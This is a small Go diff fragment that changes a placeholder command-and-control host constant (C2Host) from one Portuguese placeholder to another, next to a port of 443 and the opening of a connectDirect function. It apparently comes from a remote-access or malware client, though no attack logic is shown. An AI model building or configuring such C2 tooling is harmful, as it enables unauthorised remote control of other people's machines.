@@ -21,7 +21,7 @@ import (
 	"time"
 )
 
-const C2Host = "IP_AQUI"
+const C2Host = "IP_do_Server"
 const C2Port = "443"
 
 func connectDirect(host, port string) (net.Conn, error) {
